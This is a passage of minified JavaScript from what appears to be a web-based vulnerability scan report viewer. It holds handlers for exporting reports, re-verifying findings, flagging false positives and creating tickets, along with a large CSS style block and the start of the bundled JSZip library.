`);await yt(s),M("报告摘要已复制")}async function Er(){if(Me)try{const i=await(await ar({scan_id:Me,format:"markdown"})).blob(),t=URL.createObjectURL(i),s=document.createElement("a");s.href=t,s.download=`src-report-${Me}.md`,document.body.appendChild(s),s.click(),document.body.removeChild(s),URL.revokeObjectURL(t),M("SRC 报告已开始下载")}catch(e){M("导出失败："+(e&&e.message?e.message:"未知错误"))}}async function zr(e){const i=e.currentTarget,t=i.dataset.action,s=i.dataset.findingId,r=$e.find(n=>n.id===s);if(!Me||!r)return;if(t==="verify"){i.textContent="验证中...",i.disabled=!0;try{const n=await lr({scan_id:Me,finding_id:s,url:r.url||fi});if(n&&n.success){const c=n.reproducible===!0?"仍可复现":n.reproducible===!1?"已无法复现":"需人工复测";M(`验证完成：${c}`)}else M("验证失败："+(n&&n.error?n.error:"未知错误"))}catch{M("验证请求失败")}finally{i.textContent="验证复现",i.disabled=!1}return}const o=t==="fp"?"标记中...":t==="ticket"?"创建中...":"提交中...",a=t==="fp"?"标记误报":t==="ticket"?"工单":"确认有效";i.textContent=o,i.disabled=!0;try{if(t==="ticket"){const n=await sr({scan_id:Me,finding_name:r.title||s,severity:r.severity||"low",fix_code:r.fix_code&&r.fix_code.generic?r.fix_code.generic:"",notes:r.fix_suggestion||r.description||""});n&&n.success?(M("工单已创建"),setTimeout(function(){gr("tickets")},300)):M("工单失败："+(n&&n.error?n.error:"未知错误"))}else{const n=await dr({scan_id:Me,finding_name:r.title||s,finding_type:r.type||"",is_false_positive:t==="fp",is_confirmed:t==="confirm"});n&&n.success?M(t==="fp"?"误报，后续会用于优化检测":"已确认漏洞，已记录到反馈闭环"):M("反馈提交失败："+(n&&n.error?n.error:"未知错误"))}}catch{M(t==="ticket"?"工单创建失败":"反馈请求失败")}finally{i.textContent=a,i.disabled=!1}}function Ir(e){Nt=e,document.querySelectorAll(".src-list-item").forEach((t,s)=>{t.classList.toggle("active",s===e)});const i=document.getElementById("src-detail-panel");i&&(i.innerHTML=gi($e[e]))}function Cr(){if(document.getElementById("src-result-styles"))return;const e=document.createElement("style");e.id="src-result-styles",e.textContent=`
    .src-report-header { display:flex; gap:20px; align-items:center; background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin-bottom:16px; }
    .src-score-wrap { flex:0 0 auto; }
    .src-score-ring { width:110px; height:110px; border-radius:50%; display:flex; flex-direction:column; align-items:center; justify-content:center; border:3px solid rgba(255,255,255,0.1); }
    .src-score-value { font-size:34px; font-weight:800; line-height:1; }
    .src-score-label { font-size:11px; opacity:0.85; margin-top:4px; }
    .src-report-meta { flex:1; min-width:0; }
    .src-report-title-row { display:flex; align-items:center; gap:12px; flex-wrap:wrap; margin-bottom:10px; }
    .src-report-url { font-family:var(--font); font-size:13px; color:var(--text-secondary); word-break:break-all; }
    .src-report-stats { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:12px; }
    .src-stat { min-width:64px; text-align:center; padding:8px 10px; border-radius:var(--radius-sm); background:var(--bg-secondary); border:1px solid var(--border-light); }
    .src-stat .num { font-size:18px; font-weight:700; }
    .src-stat .label { font-size:11px; color:var(--text-secondary); }
    .src-stat.critical .num { color:#c75450; }
    .src-stat.high .num { color:#f0a732; }
    .src-stat.medium .num { color:#f0a732; }
    .src-stat.low .num { color:#73c990; }
    .src-stat.info .num { color:#808080; }
    .src-stat.total .num { color:var(--primary-light); }
    .src-report-submeta { display:flex; gap:12px; flex-wrap:wrap; font-size:12px; color:var(--text-secondary); }
    .meta-item { background:var(--token-bg); padding:3px 8px; border-radius:var(--radius-xs); }
    .src-report-actions { margin-top:12px; }
    .src-export-btn { background:var(--primary); color:#fff; border:none; padding:6px 14px; border-radius:var(--radius-xs); font-size:12px; cursor:pointer; }
    .src-export-btn:hover { background:var(--primary-light); }

    .src-quality-panel { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); margin-bottom:16px; overflow:hidden; }
    .src-quality-header { display:flex; align-items:center; gap:20px; padding:14px 18px; cursor:pointer; }
    .src-quality-score-wrap { display:flex; flex-direction:column; align-items:center; gap:4px; }
    .src-quality-ring { width:48px; height:48px; border-radius:50%; border:3px solid; display:flex; align-items:center; justify-content:center; }
    .src-quality-title { font-size:11px; color:var(--text-secondary); }
    .src-quality-bars { flex:1; display:flex; flex-direction:column; gap:6px; }
    .src-quality-bar-row { display:flex; align-items:center; gap:10px; }
    .src-quality-bar-label { width:50px; font-size:12px; color:var(--text-secondary); text-align:right; }
    .src-quality-bar { flex:1; height:8px; background:var(--bg-secondary); border-radius:4px; overflow:hidden; }
    .src-quality-bar-fill { height:100%; border-radius:4px; transition:width 0.6s ease; }
    .src-quality-bar-val { width:28px; font-size:12px; font-weight:600; text-align:right; }
    .src-quality-expand { background:var(--bg-secondary); border:1px solid var(--border); color:var(--text-secondary); padding:4px 10px; border-radius:var(--radius-xs); font-size:11px; cursor:pointer; white-space:nowrap; }
    .src-quality-expand:hover { border-color:var(--primary); color:var(--primary-light); }
    .src-quality-detail { padding:0 18px 14px; border-top:1px solid var(--border-light); }
    .src-quality-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:12px; }
    @media (max-width:700px) { .src-quality-grid { grid-template-columns:1fr; } }
    .src-quality-section { }
    .src-quality-section-title { font-size:12px; font-weight:700; color:var(--text-secondary); margin-bottom:8px; }
    .src-quality-section-body { display:flex; flex-direction:column; gap:4px; }
    .src-quality-kv { display:flex; justify-content:space-between; align-items:center; font-size:12px; }
    .src-quality-kv span { color:var(--text-secondary); }
    .src-quality-kv code { background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); font-size:11px; }
    .src-quality-dedup { display:flex; align-items:center; gap:8px; margin-top:12px; padding:10px; background:var(--bg-secondary); border-radius:var(--radius-sm); flex-wrap:wrap; }
    .src-quality-label { font-size:12px; font-weight:700; color:var(--text-secondary); }
    .src-quality-stat { font-size:13px; font-weight:600; }
    .src-quality-stat.highlight { color:var(--primary-light); }
    .src-quality-arrow { color:var(--text-secondary); }
    .src-quality-tag { background:var(--token-bg); padding:2px 8px; border-radius:10px; font-size:11px; color:var(--text-secondary); }
    .src-quality-recommendations { margin-top:12px; }
    .src-quality-rec-list { margin:0; padding-left:18px; font-size:12px; color:var(--text-secondary); }
    .src-quality-rec-list li { margin-bottom:4px; line-height:1.5; }

    .src-result-layout { display:grid; grid-template-columns:380px 1fr; gap:16px; }
    @media (max-width:900px) { .src-result-layout { grid-template-columns:1fr; } }

    .src-result-sidebar { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; max-height:calc(100vh - 220px); display:flex; flex-direction:column; }
    .src-list-header { padding:12px 14px; border-bottom:1px solid var(--border-light); font-weight:700; font-size:13px; display:flex; align-items:center; justify-content:space-between; }
    .src-list-count { background:var(--primary); color:#fff; font-size:11px; padding:2px 8px; border-radius:10px; }
    .src-list-items { overflow-y:auto; flex:1; padding:6px; }
    .src-list-item { padding:10px 12px; border-radius:var(--radius-sm); cursor:pointer; border-left:3px solid transparent; margin-bottom:4px; transition:background .12s; }
    .src-list-item:hover { background:var(--bg-secondary); }
    .src-list-item.active { background:var(--verify-selected); border-left-color:var(--primary); }
    .src-list-item.critical { border-left-color:#c75450; }
    .src-list-item.high { border-left-color:#c75450; }
    .src-list-item.medium { border-left-color:#f0a732; }
    .src-list-item.low { border-left-color:#73c990; }
    .src-list-item.info { border-left-color:#808080; }
    .src-list-row { display:flex; align-items:center; gap:8px; }
    .src-list-row.top { align-items:flex-start; }
    .src-list-row.meta { margin-top:6px; flex-wrap:wrap; font-size:11px; }
    .src-sev-badge { font-size:10px; font-weight:700; padding:2px 7px; border-radius:var(--radius-xs); color:#fff; white-space:nowrap; flex:0 0 auto; }
    .src-sev-badge.critical { background:#c75450; }
    .src-sev-badge.high { background:#c75450; }
    .src-sev-badge.medium { background:#f0a732; color:#000; }
    .src-sev-badge.low { background:#73c990; color:#000; }
    .src-sev-badge.info { background:#808080; }
    .src-list-title { font-size:13px; font-weight:600; color:var(--text-primary); flex:1; word-break:break-word; line-height:1.4; }
    .src-list-type { font-size:10px; background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); color:var(--text-secondary); }
    .src-list-param { font-size:10px; background:rgba(75,110,175,0.15); color:var(--primary-light); padding:2px 6px; border-radius:var(--radius-xs); }
    .src-list-host { color:var(--text-secondary); font-family:var(--font); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:180px; }
    .src-list-confidence { font-size:11px; color:var(--text-secondary); margin-left:auto; text-transform:uppercase; }
    .src-list-fp-tag { background:#c7545022; color:#c75450; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; }
    .src-list-merged { background:var(--primary); color:#fff; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:600; }
    .src-list-corr { background:var(--token-bg); color:var(--text-secondary); font-size:10px; padding:1px 5px; border-radius:3px; font-family:var(--font); }
    .src-list-v { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; margin-left:4px; }
    .src-list-v.confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .src-list-v.probable { background:rgba(240,167,50,0.2); color:#f0a732; }
    .src-list-v.suspected { background:rgba(199,84,80,0.2); color:#c75450; }
    .src-list-fb { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; margin-left:4px; }
    .src-list-fb.confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .src-list-fb.fp { background:rgba(128,128,128,0.2); color:#808080; }
    .src-list-confidence.high { color:#73c990; }
    .src-list-confidence.medium { color:#f0a732; }
    .src-list-confidence.low { color:#c75450; }
    .verification-badge { display:flex; gap:4px; align-items:center; }
    .verification-badge span { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:600; }
    .v-confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .v-probable { background:rgba(240,167,50,0.2); color:#f0a732; }
    .v-suspected { background:rgba(199,84,80,0.2); color:#c75450; }

    .src-result-detail { max-height:calc(100vh - 220px); overflow-y:auto; }
    .src-detail-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:0; display:flex; flex-direction:column; }
    .src-detail-header { border-bottom:1px solid var(--border-light); padding:16px 18px 14px; }
    .src-detail-title-row { display:flex; align-items:flex-start; gap:10px; margin-bottom:10px; }
    .src-detail-severity { font-size:11px; font-weight:700; padding:3px 10px; border-radius:var(--radius-xs); color:#fff; white-space:nowrap; }
    .src-detail-severity.critical { background:#c75450; }
    .src-detail-severity.high { background:#c75450; }
    .src-detail-severity.medium { background:#f0a732; color:#000; }
    .src-detail-severity.low { background:#73c990; color:#000; }
    .src-detail-severity.info { background:#808080; }
    .src-detail-title { font-size:17px; font-weight:700; margin:0; color:var(--text-primary); flex:1; line-height:1.4; }
    .src-detail-status { font-size:11px; padding:2px 8px; border-radius:var(--radius-xs); margin-left:auto; border:1px solid var(--border-light); }
    .src-detail-status.open { background:rgba(240,167,50,0.12); color:#f0a732; border-color:rgba(240,167,50,0.3); }
    .src-detail-status.confirmed { background:rgba(199,84,80,0.15); color:#c75450; border-color:rgba(199,84,80,0.3); }
    .src-detail-status.false_positive { background:rgba(128,128,128,0.15); color:#808080; border-color:rgba(128,128,128,0.3); }
    .src-detail-status.fixed { background:rgba(115,201,144,0.15); color:#73c990; border-color:rgba(115,201,144,0.3); }
    .src-detail-subtitle { display:flex; gap:10px; flex-wrap:wrap; align-items:center; font-size:12px; color:var(--text-secondary); }
    .src-detail-id { background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); }
    .src-detail-type { color:var(--primary-light); font-weight:600; }
    .src-detail-cwe { background:rgba(199,84,80,0.12); color:#e08e8a; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-owasp { background:rgba(75,110,175,0.12); color:var(--primary-light); padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-cvss { background:rgba(240,167,50,0.12); color:#f0a732; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-score { background:rgba(115,201,144,0.12); color:#73c990; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-confidence { background:var(--token-bg); color:var(--text-secondary); padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-fp-badge { background:rgba(199,84,80,0.15); color:#c75450; padding:2px 8px; border-radius:var(--radius-xs); font-weight:600; }
    .src-detail-verify-badge { padding:2px 8px; border-radius:var(--radius-xs); font-weight:600; }
    .src-detail-verify-badge.verified { background:rgba(115,201,144,0.15); color:#73c990; }
    .src-detail-verify-badge.unverified { background:rgba(240,167,50,0.15); color:#f0a732; }
    .src-detail-verify-badge.confirmed { background:rgba(115,201,144,0.15); color:#73c990; }
    .src-detail-verify-badge.probable { background:rgba(240,167,50,0.15); color:#f0a732; }
    .src-detail-verify-badge.suspected { background:rgba(199,84,80,0.15); color:#c75450; }
    .src-fp-reasons { margin-top:8px; }
    .src-fp-reasons ul { margin:0; padding-left:18px; }
    .src-fp-reasons li { font-size:12px; color:var(--text-secondary); margin-bottom:3px; }

    .src-detail-tabs { display:flex; border-bottom:1px solid var(--border-light); background:var(--bg-secondary); }
    .src-detail-tab { background:transparent; border:none; border-bottom:2px solid transparent; color:var(--text-secondary); padding:10px 16px; font-size:12px; font-weight:600; cursor:pointer; }
    .src-detail-tab:hover { color:var(--text-primary); }
    .src-detail-tab.active { color:var(--primary-light); border-bottom-color:var(--primary); background:rgba(75,110,175,0.08); }
    .src-detail-panel { display:none; padding:18px; }
    .src-detail-panel.active { display:block; }

    .src-detail-section { margin-bottom:18px; }
    .src-section-title { font-size:12px; font-weight:700; color:var(--text-primary); margin-bottom:8px; display:flex; align-items:center; gap:6px; text-transform:uppercase; letter-spacing:0.3px; }
    .src-section-body { font-size:13px; color:var(--text); line-height:1.7; }
    .src-kv { display:flex; gap:10px; margin-bottom:6px; align-items:flex-start; }
    .src-k { min-width:60px; color:var(--text-secondary); font-size:12px; }
    .src-v { flex:1; word-break:break-all; }
    .src-repro-steps { padding-left:18px; margin:0; }
    .src-repro-steps li { margin-bottom:6px; }

    .src-evidence-row { display:flex; align-items:center; gap:10px; margin-bottom:10px; flex-wrap:wrap; }
    .src-evidence-label { font-size:12px; color:var(--text-secondary); min-width:60px; }
    .src-payload { background:#3b0d0d; color:#fecaca; padding:6px 10px; border-radius:var(--radius-xs); border:1px solid rgba(199,84,80,0.35); font-size:12px; word-break:break-all; flex:1; }
    .src-signature { background:#2b2b2b; color:#bbbbbb; padding:6px 10px; border-radius:var(--radius-xs); border:1px solid var(--border-light); font-size:12px; word-break:break-all; flex:1; font-family:var(--font); }
    .src-traffic-viewer { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
    @media (max-width:1100px) { .src-traffic-viewer { grid-template-columns:1fr; } }
    .src-traffic-panel { background:var(--code-bg); border:1px solid var(--border-light); border-radius:var(--radius-sm); overflow:hidden; display:flex; flex-direction:column; min-height:180px; }
    .src-traffic-header { display:flex; align-items:center; justify-content:space-between; padding:8px 12px; background:var(--bg-secondary); border-bottom:1px solid var(--border-light); font-size:12px; font-weight:600; color:var(--text-secondary); }
    .src-traffic-header .src-copy-btn { margin:0; }
    .src-traffic-panel pre { margin:0; padding:12px; overflow:auto; max-height:420px; flex:1; }
    .src-traffic-panel code { font-family:var(--font); font-size:12px; color:var(--code-color); white-space:pre-wrap; word-break:break-all; }
    .src-screenshot-row img { max-width:100%; border:1px solid var(--border-light); border-radius:var(--radius-sm); margin-top:6px; }
    .src-no-evidence { color:var(--text-secondary); font-size:12px; }

    .src-fix-tabs { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:10px; }
    .src-fix-tab { background:var(--bg-secondary); border:1px solid var(--border-light); color:var(--text-secondary); padding:5px 12px; border-radius:var(--radius-xs); cursor:pointer; font-size:12px; }
    .src-fix-tab.active { background:var(--primary); color:#fff; border-color:var(--primary); }
    .src-fix-panel { background:var(--code-bg); border:1px solid var(--border-light); border-radius:var(--radius-sm); padding:12px; position:relative; }
    .src-fix-panel.hidden { display:none; }
    .src-fix-panel pre { margin:0; overflow:auto; max-height:360px; }
    .src-fix-panel code { font-family:var(--font); font-size:12px; color:var(--code-color); white-space:pre-wrap; word-break:break-all; }

    .src-copy-btn { background:rgba(75,110,175,0.15); border:1px solid rgba(75,110,175,0.3); color:var(--primary-light); padding:4px 10px; border-radius:var(--radius-xs); cursor:pointer; font-size:11px; }
    .src-copy-btn:hover { background:var(--primary); color:#fff; }
    .src-references { padding-left:18px; margin:0; }
    .src-references li { margin-bottom:6px; word-break:break-all; }
    .src-detail-actions { display:flex; gap:10px; flex-wrap:wrap; padding:0 18px 18px; }
    .src-action-btn { background:var(--bg-secondary); border:1px solid var(--border-light); color:var(--text-secondary); padding:6px 14px; border-radius:var(--radius-xs); cursor:pointer; font-size:12px; }
    .src-action-btn:hover { border-color:var(--primary); color:var(--primary-light); }
    .src-action-btn.verify { background:rgba(75,110,175,0.12); color:var(--primary-light); border-color:rgba(75,110,175,0.3); }
    .src-action-btn.false-positive { background:rgba(115,201,144,0.12); color:#73c990; border-color:rgba(115,201,144,0.3); }
    .src-action-btn.confirm { background:rgba(199,84,80,0.12); color:#c75450; border-color:rgba(199,84,80,0.3); }
    .src-action-btn.ticket { background:rgba(75,110,175,0.12); color:var(--primary-light); border-color:rgba(75,110,175,0.3); }
    .src-detail-footer { font-size:12px; color:var(--text-secondary); border-top:1px solid var(--border-light); padding:12px 18px; }
    .src-empty { padding:30px; text-align:center; color:var(--text-secondary); }
    .src-empty-detail { padding:40px; text-align:center; color:var(--text-secondary); background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); }
  `,document.head.appendChild(e)}function Tr(){Cr()}var It=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function Ar(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}function Ct(e){throw new Error('Could not dynamically require "'+e+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}var Yt={exports:{}};/*!

JSZip v3.10.1 - A JavaScript class for generating and reading zip files
<http://stuartk.com/jszip>

(c) 2009-2016 Stuart Knightley <stuart [at] stuartk.com>
Dual licenced under the MIT license or GPLv3. See https://raw.github.com/Stuk/jszip/main/LICENSE.markdown.

JSZip uses the library pako released under the MIT license :
https://github.com/nodeca/pako/blob/main/LICENSE
*/var Li;function Br(){return Li||(Li=1,(function(e,i){(function(t){e.exports=t()})(function(){return(function t(s,r,o){function a(p,v){if(!r[p]){if(!s[p]){var d=typeof Ct=="function"&&Ct;if(!v&&d)return d(p,!0);if(n)return n(p,!0);var f=new Error("Cannot find module '"+p+"'");throw f.code="MODULE_NOT_FOUND",f}var h=r[p]={exports:{}};s[p][0].call(h.exports,function(m){var g=s[p][1][m];return a(g||m)},h,h.exports,t,s,r,o)}return r[p].exports}for(var n=typeof Ct=="function"&&Ct,c=0;c<o.length;c++)a(o[c]);return a})({1:[function(t,s,r){var o=t("./utils"),a=t("./support"),n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";r.encode=function(c){for(var p,v,d,f,h,m,g,y=[],b=0,k=c.length,x=k,I=o.getTypeOf(c)!=="string";b<c.length;)x=k-b,d=I?(p=c[b++],v=b<k?c[b++]:0,b<k?c[b++]:0):(p=c.charCodeAt(b++),v=b<k?c.charCodeAt(b++):0,b<k?c.charCodeAt(b++):0),f=p>>2,h=(3&p)<<4|v>>4,m=1<x?(15&v)<<2|d>>6:64,g=2<x?63&d:64,y.push(n.charAt(f)+n.charAt(h)+n.charAt(m)+n.charAt(g));return y.join("")},r.decode=function(c){var p,v,d,f,h,m,g=0,y=0,b="data:";if(c.substr(0,b.length)===b)throw new Error("Invalid base64 input, it looks like a data url.");var k,x=3*(c=c.replace(/[^A-Za-z0-9+/=]/g,"")).length/4;if(c.charAt(c.length-1)===n.charAt(64)&&x--,c.charAt(c.length-2)===n.charAt(64)&&x--,x%1!=0)throw new Error("Invalid base64 input, bad content length.");for(k=a.uint8array?new Uint8Array(0|x):new Array(0|x);g<c.length;)p=n.indexOf(c.charAt(g++))<<2|(f=n.indexOf(c.charAt(g++)))>>4,v=(15&f)<<4|(h=n.indexOf(c.charAt(g++)))>>2,d=(3&h)<<6|(m=n.indexOf(c.charAt(g++))),k[y++]=p,h!==64&&(k[y++]=v),m!==64&&(k[y++]=d);return k}},{"./support":30,"./utils":32}],2:[function(t,s,r){var o=t("./external"),a=t("./stream/DataWorker"),n=t("./stream/Crc32Probe"),c=t("./stream/DataLengthProbe");function p(v,d,f,h,m){this.compressedSize=v,this.uncompressedSize=d,this.crc32=f,this.compression=h,this.compressedContent=m}p.prototype={getContentWorker:function(){var v=new a(o.Promise.resolve(this.compressedContent)).pipe(this.compression.uncompressWorker()).pipe(new c("data_length")),d=this;return v.on("end",function(){if(this.streamInfo.data_length!==d.uncompressedSize)throw new Error("Bug : uncompressed data size mismatch")}),v},getCompressedWorker:function(){return new a(o.Promise.resolve(this.compressedContent)).withStreamInfo("compressedSize",this.compressedSize).withStreamInfo("uncompressedSize",this.uncompressedSize).withStreamInfo("crc32",this.crc32).withStreamInfo("compression",this.compression)}},p.createWorkerFrom=function(v,d,f){return v.pipe(new n).pipe(new c("uncompressedSize")).pipe(d.compressWorker(f)).pipe(new c("compressedSize")).withStreamInfo("compression",d)},s.exports=p},{"./external":6,"./stream/Crc32Probe":25,"./stream/DataLengthProbe":26,"./stream/DataWorker":27}],3:[function(t,s,r){var o=t("./stream/GenericWorker");r.STORE={magic:"\0\0",compressWorker:function(){return new o("STORE compression")},uncompressWorker:function(){return new o("STORE decompression")}},r.DEFLATE=t("./flate")},{"./flate":7,"./stream/GenericWorker":28}],4:[function(t,s,r){var o=t("./utils"),a=(function(){for(var n,c=[],p=0;p<256;p++){n=p;for(var v=0;v<8;v++)n=1&n?3988292384^n>>>1:n>>>1;c[p]=n}return c})();s.exports=function(n,c){return n!==void 0&&n.length?o.getTypeOf(n)!=="string"?(function(p,v,d,f){var h=a,m=f+d;p^=-1;for(var g=f;g<m;g++)p=p>>>8^h[255&(p^v[g])];return-1^p})(0|c,n,n.length,0):(function(p,v,d,f){var h=a,m=f+d;p^=-1;for(var g=f;g<m;g++)p=p>>>8^h[255&(p^v.charCodeAt(g))];return-1^p})(0|c,n,n.length,0):0}},{"./utils":32}],5:[function(t,s,r){r.base64=!1,r.binary=!1,r.dir=!1,r.createFolders=!0,r.date=null,r.compression=null,r.compressionOptions=null,r.comment=null,r.unixPermissions=null,r.dosPermissions=null},{}],6:[function(t,s,r){var o=null;o=typeof Promise<"u"?Promise:t("lie"),s.exports={Promise:o}},{lie:37}],7:[function(t,s,r){var o=typeof Uint8Array<"u"&&typeof Uint16Array<"u"&&typeof Uint32Array<"u",a=t("pako"),n=t("./utils"),c=t("./stream/GenericWorker"),p=o?"uint8array":"array";function v(d,f){c.call(this,"FlateWorker/"+d),this._pako=null,this._pakoAction=d,this._pakoOptions=f,this.meta={}}r.magic="\b\0",n.inherits(v,c),v.prototype.processChunk=function(d){this.meta=d.meta,this._pako===null&&this._createPako(),this._pako.push(n.transformTo(p,d.data),!1)},v.prototype.flush=function(){c.prototype.flush.call(this),this._pako===null&&this._createPako(),this._pako.push([],!0)},v.prototype.cleanUp=function(){c.prototype.cleanUp.call(this),this._pako=null},v.prototype._createPako=function(){this._pako=new a[this._pakoAction]({raw:!0,level:this._pakoOptions.level||-1});var d=this;this._pako.onData=function(f){d.push({data:f,meta:d.meta})}},r.compressWorker=function(d){return new v("Deflate",d)},r.uncompressWorker=function(){return new v("Inflate",{})}},{"./stream/GenericWorker":28,"./utils":32,pako:38}],8:[function(t,s,r){function o(h,m){var g,y="";for(g=0;g<m;g++)y+=String.fromCharCode(255&h),h>>>=8;return y}function a(h,m,g,y,b,k){var x,I,z=h.file,R=h.compression,O=k!==p.utf8encode,j=n.transformTo("string",k(z.name)),P=n.transformTo("string",p.utf8encode(z.name)),N=z.comment,Y=n.transformTo("string",k(N)),S=n.transformTo("string",p.utf8encode(N)),H=P.length!==z.name.length,l=S.length!==N.length,A="",J="",D="",q=z.dir,$=z.date,te={crc32:0,compressedSize:0,uncompressedSize:0};m&&!g||(te.crc32=h.crc32,te.compressedSize=h.compressedSize,te.uncompressedSize=h.uncompressedSize);var B=0;m&&(B|=8),O||!H&&!l||(B|=2048);var T=0,ee=0;q&&(T|=16),b==="UNIX"?(ee=798,T|=(function(X,ge){var re=X;return X||(re=ge?16893:33204),(65535&re)<<16})(z.unixPermissions,q)):(ee=20,T|=(function(X){return 63&(X||0)})(z.dosPermissions)),x=$.getUTCHours(),x<<=6,x|=$.getUTCMinutes(),x<<=5,x|=$.getUTCSeconds()/2,I=$.getUTCFullYear()-1980,I<<=4,I|=$.getUTCMonth()+1,I<<=5,I|=$.getUTCDate(),H&&(J=o(1,1)+o(v(j),4)+P,A+="up"+o(J.length,2)+J),l&&(D=o(1,1)+o(v(Y),4)+S,A+="uc"+o(D.length,2)+D);var K="";return K+=`
\0`,K+=o(B,2),K+=R.magic,K+=o(x,2),K+=o(I,2),K+=o(te.crc32,4),K+=o(te.compressedSize,4),K+=o(te.uncompressedSize,4),K+=o(j.length,2),K+=o(A.length,2),{fileRecord:d.LOCAL_FILE_HEADER+K+j+A,dirRecord:d.CENTRAL_FILE_HEADER+o(ee,2)+K+o(Y.length,2)+"\0\0\0\0"+o(T,4)+o(y,4)+j+A+Y}}var n=t("../utils"),c=t("../stream/GenericWorker"),p=t("../utf8"),v=t("../crc32"),d=t("../signature");function f(h,m,g,y){c.call(this,"ZipFileWorker"),this.bytesWritten=0,this.zipComment=m,this.zipPlatform=g,this.encodeFileName=y,this.streamFiles=h,this.accumulate=!1,this.contentBuffer=[],this.dirRecords=[],this.currentSourceOffset=0,this.entriesCount=0,this.currentFile=null,this._sources=[]}n.inherits(f,c),f.prototype.push=function(h){var m=h.meta.percent||0,g=this.entriesCount,y=this._sources.length;this.accumulate?this.contentBuffer.push(h):(this.bytesWritten+=h.data.length,c.prototype.push.call(this,{data:h.data,meta:{currentFile:this.currentFile,percent:g?(m+100*(g-y-1))/g:100}}))},f.prototype.openedSource=function(h){this.currentSourceOffset=this.bytesWritten,this.currentFile=h.file.name;var m=this.streamFiles&&!h.file.dir;if(m){var g=a(h,m,!1,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);this.push({data:g.fileRecord,meta:{percent:0}})}else this.accumulate=!0},f.prototype.closedSource=function(h){this.accumulate=!1;var m=this.streamFiles&&!h.file.dir,g=a(h,m,!0,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);if(this.dirRecords.push(g.dirRecord),m)this.push({data:(function(y){return d.DATA_DESCRIPTOR+o(y.crc32,4)+o(y.compressedSize,4)+o(y.uncompressedSize,4)})(h),meta:{percent:100}});else for(this.push({data:g.fileRecord,meta:{percent:0}});this.contentBuffer.length;)this.push(this.contentBuffer.shift());this.currentFile=null},f.prototype.flush=function(){for(var h=this.bytesWritten,m=0;m<this.dirRecords.length;m++)this.push({data:this.dirRecords[m],meta:{percent:100}});var g=this.bytesWritten-h,y=(function(b,k,x,I,z){var R=n.transformTo("string",z(I));return d.CENTRAL_DIRECTORY_END+"\0\0\0\0"+o(b,2)+o(b,2)+o(k,4)+o(x,4)+o(R.length,2)+R})(this.dirRecords.length,g,h,this.zipComment,this.encodeFileName);this.push({data:y,meta:{percent:100}})},f.prototype.prepareNextSource=function(){this.previous=this._sources.shift(),this.openedSource(this.previous.streamInfo),this.isPaused?this.previous.pause():this.previous.resume()},f.prototype.registerPrevious=function(h){this._sources.push(h);var m=this;return h.on("data",function(g){m.processChunk(g)}),h.on("end",function(){m.closedSource(m.previous.streamInfo),m._sources.length?m.prepareNextSource():m.end()}),h.on("error",function(g){m.error(g)}),this},f.prototype.resume=function(){return!!c.prototype.resume.call(this)&&(!this.previous&&this._sources.length?(this.prepareNextSource(),!0):this.previous||this._sources.length||this.generatedError?void 0:(this.end(),!0))},f.prototype.error=function(h){var m=this._sources;if(!c.prototype.error.call(this,h))return!1;for(var g=0;g<m.length;g++)try{m[g].error(h)}catch{}return!0},f.prototype.lock=function(){c.prototype.lock.call(this);for(var h=this._sources,m=0;m<h.length;m++)h[m].lock()},s.exports=f},{"../crc32":4,"../signature":23,"../stream/GenericWorker":28,"../utf8":31,"../utils":32}],9:[function(t,s,r){var o=t("../compressions"),a=t("./ZipFileWorker");r.generateWorker=function(n,c,p){var v=new a(c.streamFiles,p,c.platform,c.encodeFileName),d=0;try{n.forEach(function(f,h){d++;var m=(function(k,x){var I=k||x,z=o[I];if(!z)throw new Error(I+" is not a valid compression method !");return z})(h.options.compression,c.compression),g=h.options.compressionOptions||c.compressionOptions||{},y=h.dir,b=h.date;h._compressWorker(m,g).withStreamInfo("file",{name:f,dir:y,date:b,comment:h.comment||"",unixPermissions:h.unixPermissions,dosPermissions:h.dosPermissions}).pipe(v)}),v.entriesCount=d}catch(f){v.error(f)}return v}},{"../compressions":3,"./ZipFileWorker":8}],10:[function(t,s,r){function o(){if(!(this instanceof o))return new o;if(arguments.length)throw new Error("The constructor with parameters has been removed in JSZip 3.0, please check the upgrade guide.");this.files=Object.create(null),this.comment=null,this.root="",this.clone=function(){var a=new o;for(var n in this)typeof this[n]!="function"&&(a[n]=this[n]);return a}}(o.prototype=t("./object")).loadAsync=t("./load"),o.support=t("./support"),o.defaults=t("./defaults"),o.version="3.10.1",o.loadAsync=function(a,n){return new o().loadAsync(a,n)},o.external=t("./external"),s.exports=o},{"./defaults":5,"./external":6,"./load":11,"./object":15,"./support":30}],11:[function(t,s,r){var 